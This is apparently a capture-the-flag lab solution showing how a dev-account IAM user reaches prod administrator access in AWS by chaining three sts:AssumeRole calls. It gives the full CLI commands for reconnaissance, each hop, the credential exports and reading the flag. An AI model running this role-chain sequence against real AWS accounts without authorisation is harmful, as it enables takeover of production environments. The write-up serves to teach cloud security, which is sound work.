# Solution: Dev to Prod Cross-Account Role Chain to Admin

This scenario demonstrates something that does not require a single misconfigured permission or an exotic privilege escalation primitive — only trust relationships doing exactly what they were designed to do. A non-admin IAM user in the dev account has a straight-line path to full administrative access in the prod account, assembled entirely from `sts:AssumeRole` calls. No IAM modifications. No code execution. No exploitation of a bug in AWS. Just trust policies pointing at each other across accounts in a way that nobody noticed added up to a production takeover.

The pattern is extraordinarily common. Dev accounts exist to give engineers a place to experiment, and their roles accumulate permissions over time — often including cross-account trust relationships established for CI/CD pipelines, data sync jobs, or one-off migrations that were never cleaned up. When a dev role's trust chain terminates on a prod admin role, the account boundary is a paperwork fiction. Any attacker who compromises a dev credential starts the clock on full prod access.

What makes this scenario particularly instructive is that no individual role in the chain looks dangerous. The dev starting user cannot do anything meaningful in prod. The dev role holds no elevated permissions. The prod non-admin role is, by name and by policy, non-admin. The risk is invisible to per-resource analysis and only emerges when you follow the chain.

## The Challenge

You start as `pl-dev-sts-role-chain-starting-user`, an IAM user in the dev account. Your goal is to achieve full administrative access in the prod account and retrieve the CTF flag from SSM Parameter Store.

Your starting credentials are associated with the dev account. The target is `pl-prod-sts-role-chain-prod-admin-role` — an IAM role with `AdministratorAccess` in the prod account. You need to traverse a three-hop role chain to get there:

1. Dev user → `pl-dev-sts-role-chain-dev-role` (same account, dev) via `sts:AssumeRole`
2. Dev role → `pl-prod-sts-role-chain-prod-non-admin-role` (cross-account, prod) via `sts:AssumeRole`
3. Prod non-admin role → `pl-prod-sts-role-chain-prod-admin-role` (same account, prod) via `sts:AssumeRole`

At each step, you receive temporary STS credentials that you must export before making the next call.

## Reconnaissance

Start by confirming your identity and looking for what trust relationships exist from your starting foothold.

```bash
# Confirm your starting identity
aws sts get-caller-identity
```

Note the dev account ID in the output. Now look for roles your user can assume:

```bash
# List roles in the dev account (iam:ListRoles is in your helpful permissions)
aws iam list-roles \
  --query 'Roles[].[RoleName, Arn]' \
  --output table
```

You should see `pl-dev-sts-role-chain-dev-role` listed. Inspect its trust policy to confirm your user is a trusted principal:

```bash
aws iam get-role \
  --role-name pl-dev-sts-role-chain-dev-role \
  --query 'Role.AssumeRolePolicyDocument'
```

The trust policy shows the starting user (or the dev account) as a trusted principal. Now look at what permissions the dev role holds — specifically whether it can assume any roles in other accounts:

```bash
aws iam list-role-policies --role-name pl-dev-sts-role-chain-dev-role
aws iam list-attached-role-policies --role-name pl-dev-sts-role-chain-dev-role
```

You will find a policy granting `sts:AssumeRole` on a prod account role ARN. That is your cross-account bridge.

## Exploitation

### Hop 1: Assume the Dev Role

Assume `pl-dev-sts-role-chain-dev-role` from the starting user. Export all three credential fields from the response — the session token is required for every subsequent call:

```bash
DEV_CREDS=$(aws sts assume-role \
  --role-arn arn:aws:iam::{DEV_ACCOUNT_ID}:role/pl-dev-sts-role-chain-dev-role \
  --role-session-name hop1 \
  --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' \
  --output text)

export AWS_ACCESS_KEY_ID=$(echo "$DEV_CREDS" | awk '{print $1}')
export AWS_SECRET_ACCESS_KEY=$(echo "$DEV_CREDS" | awk '{print $2}')
export AWS_SESSION_TOKEN=$(echo "$DEV_CREDS" | awk '{print $3}')
```

Verify the hop succeeded:

```bash
aws sts get-caller-identity
# Should show: arn:aws:sts::{DEV_ACCOUNT_ID}:assumed-role/pl-dev-sts-role-chain-dev-role/hop1
```

You are now the dev role. Use the helpful `iam:ListRoles` permission to look for what this role can assume:

```bash
aws iam list-roles \
  --query 'Roles[].[RoleName, Arn]' \
  --output table
```

You will see prod account role ARNs — specifically `pl-prod-sts-role-chain-prod-non-admin-role`. This is the cross-account target.

### Hop 2: Cross-Account Assume the Prod Non-Admin Role

With the dev role credentials active, assume `pl-prod-sts-role-chain-prod-non-admin-role` in the prod account. The prod role's trust policy explicitly permits assumption by the dev role:

```bash
PROD_CREDS=$(aws sts assume-role \
  --role-arn arn:aws:iam::{PROD_ACCOUNT_ID}:role/pl-prod-sts-role-chain-prod-non-admin-role \
  --role-session-name hop2 \
  --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' \
  --output text)

export AWS_ACCESS_KEY_ID=$(echo "$PROD_CREDS" | awk '{print $1}')
export AWS_SECRET_ACCESS_KEY=$(echo "$PROD_CREDS" | awk '{print $2}')
export AWS_SESSION_TOKEN=$(echo "$PROD_CREDS" | awk '{print $3}')
```

Verify the account boundary was crossed:

```bash
aws sts get-caller-identity
# Should show: arn:aws:sts::{PROD_ACCOUNT_ID}:assumed-role/pl-prod-sts-role-chain-prod-non-admin-role/hop2
```

You are now operating in the prod account. Despite being called a "non-admin" role, it can assume the prod admin role. Use `iam:ListRoles` one more time to find the final target:

```bash
aws iam list-roles \
  --query 'Roles[?contains(RoleName, `admin`)].[RoleName, Arn]' \
  --output table
```

### Hop 3: Assume the Prod Admin Role

The final hop is the simplest. Assume `pl-prod-sts-role-chain-prod-admin-role` from the prod non-admin role:

```bash
ADMIN_CREDS=$(aws sts assume-role \
  --role-arn arn:aws:iam::{PROD_ACCOUNT_ID}:role/pl-prod-sts-role-chain-prod-admin-role \
  --role-session-name hop3 \
  --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' \
  --output text)

export AWS_ACCESS_KEY_ID=$(echo "$ADMIN_CREDS" | awk '{print $1}')
export AWS_SECRET_ACCESS_KEY=$(echo "$ADMIN_CREDS" | awk '{print $2}')
export AWS_SESSION_TOKEN=$(echo "$ADMIN_CREDS" | awk '{print $3}')
```

## Verification

Confirm the final identity and verify admin access:

```bash
aws sts get-caller-identity
# Should show: arn:aws:sts::{PROD_ACCOUNT_ID}:assumed-role/pl-prod-sts-role-chain-prod-admin-role/hop3
```

Prove the credentials grant administrative access by listing IAM users — an operation that requires elevated permissions:

```bash
aws iam list-users --query 'Users[].[UserName, Arn]' --output table
```

If the command returns a list of IAM users in the prod account, you have confirmed full administrative access. You started as a non-admin user in the dev account and now hold `AdministratorAccess` in prod — using nothing but trust relationships that already existed.

## Capture the Flag

The final step is retrieving the CTF flag, which proves the end-to-end attack chain worked. For `to-admin` scenarios, the flag lives in AWS Systems Manager Parameter Store under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on the specific parameter, which the `AdministratorAccess` policy on `pl-prod-sts-role-chain-prod-admin-role` grants implicitly.

Using the admin credentials you now hold (the `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, and `AWS_SESSION_TOKEN` exported in Hop 3), retrieve the flag:

```bash
aws ssm get-parameter \
  --name /pathfinding-labs/flags/sts-role-chain-to-admin \
  --query 'Parameter.Value' \
  --output text
```

The value returned is the flag for this scenario. Its exact contents are deployment-specific — the default ships in `flags.default.yaml` in the repo root, and hosted lab environments may substitute their own values. The retrieval mechanism is identical across every `to-admin` scenario; only the scenario ID in the parameter path changes.

## What Happened

You traversed a three-hop role chain that crossed an AWS account boundary using only `sts:AssumeRole`:

1. The dev starting user assumed `pl-dev-sts-role-chain-dev-role` within the dev account — a legitimate-looking assume-role grant that gives the user access to deployment tooling.
2. The dev role assumed `pl-prod-sts-role-chain-prod-non-admin-role` in the prod account via a cross-account trust relationship — the kind of connection established for CI/CD pipelines or shared services.
3. The prod non-admin role assumed `pl-prod-sts-role-chain-prod-admin-role` within prod — a final escalation step hidden inside the prod account, invisible to anyone analyzing the dev account in isolation.

This is what makes pure role-chain attacks so dangerous: no single permission is unusual. Every `sts:AssumeRole` grant in the chain has a plausible operational justification. The risk only materializes when all three are present simultaneously and happen to be connected. A security reviewer auditing the dev account sees a user who can assume a dev role — nothing alarming. A reviewer auditing the prod account sees a non-admin role that can assume an admin role — potentially concerning, but perhaps intentional for runbook purposes. Only graph-based IAM analysis that follows the full transitive chain surfaces the complete picture: an unauthenticated attacker who compromises any dev credential has a direct path to production admin access.
